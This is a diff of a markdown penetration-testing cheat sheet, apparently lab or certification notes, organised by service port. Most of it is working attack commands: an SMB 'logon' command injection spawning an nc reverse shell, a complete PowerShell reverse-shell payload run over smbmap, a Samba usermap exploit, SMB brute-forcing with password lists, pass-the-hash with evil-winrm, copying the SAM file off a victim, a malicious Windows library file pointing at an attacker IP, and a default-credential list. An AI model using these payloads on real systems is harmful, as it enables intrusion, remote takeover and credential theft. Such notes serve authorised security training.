@@ -188,7 +188,7 @@ amass enum -ip 10.11.1.1/24
 
 ### Common
 
-```bash
+```
 # Check real file type
 file file.xxx
 
@@ -214,7 +214,7 @@ wine OpenPuff/OpenPuff_release/OpenPuff.exe
 
 ### Disk files
 
-```bash
+```
 # guestmount can mount any kind of disk file
 sudo apt-get install libguestfs-tools
 guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
@@ -222,7 +222,7 @@ guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
 
 ### Images
 
-```bash
+```
 # Stego
 wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
 chmod +x stegsolve.jar
@@ -240,7 +240,7 @@ identify -verbose image.jpeg
 
 ### Audio
 
-```bash
+```
 # Check spectrogram
 wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
 dpkg -i sonic-visualiser_4.0_amd64.deb
@@ -249,11 +249,9 @@ dpkg -i sonic-visualiser_4.0_amd64.deb
 hideme stego.mp3 -f && cat output.txt #AudioStego
 ```
 
-
-
 ## Port 21 - FTP
 (https://book.hacktricks.xyz/pentesting/pentesting-ftp)
-```bash
+```
 nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
 USER anonymous / admin / found username
 PASS anonymous / admin / found username
@@ -300,7 +298,7 @@ debug1: Authentications that can continue: publickey,password,keyboard-interacti
 
 SSH via Non-Standard Port:
 
-$ ssh -v 10.10.1.111 -p 43022
+$ ssh -v 10.10.1.111 -p 2222
 
 SSH no matching key exchange method found:
 
@@ -309,7 +307,6 @@ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 bob@10.11.1.136
 Server requiring ssh-rsa,ssh-dss:
 	ssh -p 22 patrick@192.168.216.39 -oHostKeyAlgorithms=+ssh-dss 
 Error message: Unable to negotiate with 192.168.216.39 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
-
 
 Force Auth Method:
 
@@ -513,8 +510,6 @@ msf > use exploit/windows/dcerpc/ms03_026_dcom
 ```
 
 ## Port 139/445 - SMB
-
-
 ```
 # Enum hostname
 	enum4linux -n 10.11.1.111
@@ -527,9 +522,8 @@ msf > use exploit/windows/dcerpc/ms03_026_dcom
 # Get smb_version
 	sudo Msfconsole -x "use scanner/smb/smb_version; set RHOSTS 192.168.X.X; run"
 
-ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'
-
-smbclient -L \\\\10.11.1.111
+# List Shares 
+	smbclient -L \\\\10.11.1.111
 
 # Connect To Share
 
@@ -559,58 +553,58 @@ smbclient -L \\\\10.11.1.111
 	smbclient -L \\\\10.11.1.111\\
 
 # Check null sessions
-smbmap -H 10.11.1.111
-rpcclient -U "" -N 10.11.1.111
-smbclient //10.11.1.111/IPC$ -N
+	smbmap -H 10.11.1.111
+	rpcclient -U "" -N 10.11.1.111
+	smbclient //10.11.1.111/IPC$ -N
 
 # Exploit null sessions
-enum -s 10.11.1.111
-enum -U 10.11.1.111
-enum -P 10.11.1.111
-enum4linux -a 10.11.1.111
-/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111
+	enum -s 10.11.1.111
+	enum -U 10.11.1.111
+	enum -P 10.11.1.111
+	enum4linux -a 10.11.1.111
+	/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111
 
 # Connect to username shares
-smbclient //10.11.1.111/share -U username
+	smbclient //10.11.1.111/share -U username
 
 # Connect with a user and password
 
-smbclient -U "fox%iparalipomenidellabatracomiomachia"  //192.168.123.157/
+	smbclient -U "fox%iparalipomenidellabatracomiomachia"  //192.168.123.157/
 
 # Connect to share anonymously
-smbclient \\\\10.11.1.111\\<share>
-smbclient //10.11.1.111/<share>
-smbclient //10.11.1.111/<share\ name>
-smbclient //10.11.1.111/<""share name"">
-rpcclient -U " " 10.11.1.111
-rpcclient -U " " -N 10.11.1.111
+	smbclient \\\\10.11.1.111\\<share>
+	smbclient //10.11.1.111/<share>
+	smbclient //10.11.1.111/<share\ name>
+	smbclient //10.11.1.111/<""share name"">
+	rpcclient -U " " 10.11.1.111
+	rpcclient -U " " -N 10.11.1.111
 
 # Check vulns
-nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111
+	nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111
 
 # Check common security concerns
-msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc
+	msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc
 
 # Extra validation
-msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc
+	msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc
 
 # Multi exploits
-msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run
+	msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run
 
 # Bruteforce login
-medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
-nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
-nmap –script smb-brute 10.11.1.111
+	medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
+	nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
+	nmap –script smb-brute 10.11.1.111
 
 # nmap smb enum & vuln
-nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
-nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111
+	nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
+	nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111
 
 # Mount smb volume linux
-mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share
+	mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share
 
 # rpcclient commands
-rpcclient -U "" 10.11.1.111
+	rpcclient -U "" 10.11.1.111
 	srvinfo
 	enumdomusers
 	getdompwinfo
@@ -619,66 +613,64 @@ rpcclient -U "" 10.11.1.111
 	netshareenumall
 
 # Run cmd over smb from linux
-winexe -U username //10.11.1.111 "cmd.exe" --system
+	winexe -U username //10.11.1.111 "cmd.exe" --system
 
 #smb reverse shell with "logon" cmd
-logon "/=`nc 10.10.14.5 4444 -e /bin/bash`"
+	logon "/=`nc 10.10.14.5 4444 -e /bin/bash`"
 
 # General SMB Tips
 	If you find a writable folder, upload reverse shells to it. It might get executed by a cronjob
 
 # smbmap
-smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum
-smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 #RCE
-smbmap.py -H 10.11.1.111 -u username -p 'P@$$w0rd1234!' -L # Drive Listing
-smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' # Reverse Shell
-
-# Check
-\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "
+	smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum
+	smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 #RCE
+	smbmap.py -H 10.11.1.111 -u username -p 'P@$$w0rd1234!' -L # Drive Listing
+	smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' # Reverse Shell
 
 # Windows Library Code
 
-<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-<name>@windows.storage.dll,-34582</name>
-<version>6</version>
-<isLibraryPinned>true</isLibraryPinned>
-<iconReference>imageres.dll,-1003</iconReference>
-<templateInfo>
-<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
-</templateInfo>
-<searchConnectorDescriptionList>
-<searchConnectorDescription>
-<isDefaultSaveLocation>true</isDefaultSaveLocation>
-<isSupported>false</isSupported>
-<simpleLocation>
-<url>http://192.168.45.$myIP</url>
-</simpleLocation>
-</searchConnectorDescription>
-</searchConnectorDescriptionList>
-</libraryDescription>
-
+	<?xml version="1.0" encoding="UTF-8"?>
+	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+	<name>@windows.storage.dll,-34582</name>
+	<version>6</version>
+	<isLibraryPinned>true</isLibraryPinned>
+	<iconReference>imageres.dll,-1003</iconReference>
+	<templateInfo>
+	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+	</templateInfo>
+	<searchConnectorDescriptionList>
+	<searchConnectorDescription>
+	<isDefaultSaveLocation>true</isDefaultSaveLocation>
+	<isSupported>false</isSupported>
+	<simpleLocation>
+	<url>http://192.168.45.$myIP</url>
+	</simpleLocation>
+	</searchConnectorDescription>
+	</searchConnectorDescriptionList>
+	</libraryDescription>
 
 ```
 ## Port 143/993 IMAP
-REF: Postfish
 
 Banner Grab
 ```
-telnet 10.11.1.111 143 #Connect to read emails
-
-openssl s_client -connect 10.11.1.111:993 -quiet  #Encrypted connection
+	telnet 10.11.1.111 143
+	openssl s_client -connect 10.11.1.111:993 -quiet
 ```
+
 ## Port 161/162 UDP - SNMP
 
 ```
 nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
 snmp-check 10.11.1.111 -c public|private|community
+
 # Verbose Inspetion
 	snmpwalk -v2c -c public 192.168.250.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
-download-mibs
-apt-get install snmp-mibs-downloader
-# Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
+
+# Downloading nsExtendObjects:
+	download-mibs
+	apt-get install snmp-mibs-downloader
+	Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
 ```
 
 ## LDAP - 389,636
@@ -883,9 +875,6 @@ Port Forwarding Over SSH For VNC:
 ## WinRM - 5985
 
 ```
-https://github.com/Hackplayers/evil-winrm
-gem install evil-winrm
-
 # Authenticate With Password
 	evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
 # Authetnicate With Hash
@@ -893,17 +882,15 @@ gem install evil-winrm
 # With Scripts
 	evil-winrm -i 10.10.121.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -e /home/kali/Documents/tools
 
-Downloading Files From Victim To Kali:
+# Downloading Files From Victim To Kali:
 	download C:\users\celia.almeda\Desktop\SAM /home/kali/Documents/SAM
 
-Uploading Files From Kali To Victim:
+# Uploading Files From Kali To Victim:
 	upload /home/kali/Documents/tools/reverse.exe C:\users\celia.almeda\Desktop\Reverse.exe
 
 ```
 
 ## Redis - 6379
-
-Ref: Sybaris, Wombo
 
 ```
 https://github.com/Avinash-acid/Redis-Server-Exploit
@@ -958,7 +945,6 @@ Login:
 Upload Shell
 	put reverse.php .
 
-
 ```
 
 ## Unknown ports
@@ -966,9 +952,6 @@ Upload Shell
 - `amap -d 10.11.1.111 8000`
 - netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
 - sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, 	using basic HTTP configurations
-- Try zone transfer for subdomains: `dig axfr @10.11.1.111 hostname.box`, `dnsenum 10.11.1.111`, `dnsrecon -d domain.com -t axfr`
-
-Try admin:admin, user:user
 
 ## Port 6667 - IRC
 
@@ -1062,31 +1045,6 @@ wpscan --url https://192.168.200.148:12380/blogblog/wp-login.php --passwords ../
 
 # Transforming long text into one word per line
 # Useful for password cracking
-
-curl http://192.168.164.142/iamGaara | grep -oE '\w+' | sort -u -f | more
-
-----
-
-Check IP behing WAF:
-	https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
-
-pingback.xml:
-<?xml version="1.0" encoding="iso-8859-1"?>
-<methodCall>
-<methodName>pingback.ping</methodName>
-<params>
- <param>
-  <value>
-   <string>http://10.0.0.1/hello/world</string>
-  </value>
- </param>
- <param>
-  <value>
-   <string>https://IP.com/2020/01/22/hello-world/</string>
-  </value>
- </param>
-</params>
-</methodCall>
 
 curl -X POST -d @pingback.xml https://ip.com/xmlrpc.php
 
@@ -1222,33 +1180,33 @@ padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cooki
 Search documentation for default passwords and test them
 
 ```
-site:webapplication.com password
+	site:webapplication.com password
 ```
 
 ```
-admin / admin
-admin / password
-admin / admin12345
-admin / letmeinplease
-admin / <blank>
-admin / <servicename>
-admin / <name of the box>
-administrator / admin
-user / user
-user / 12345
-user / password
-guest / guest
-root / root
-root / admin
-root / password
-root / <servicename>
-<username if you have> / password
-<username if you have> / admin
-<username if you have> / username
-username / <servicename>
-<name of the box> / <name of the box>
-<name of the service / application> <name of the service / application>
-default account / <name of the application>
+	admin / admin
+	admin / password
+	admin / admin12345
+	admin / letmeinplease
+	admin / <blank>
+	admin / <servicename>
+	admin / <name of the box>
+	administrator / admin
+	user / user
+	user / 12345
+	user / password
+	guest / guest
+	root / root
+	root / admin
+	root / password
+	root / <servicename>
+	<username if you have> / password
+	<username if you have> / admin
+	<username if you have> / username
+	username / <servicename>
+	<name of the box> / <name of the box>
+	<name of the service / application> <name of the service / application>
+	default account / <name of the application>
 
 ```
 
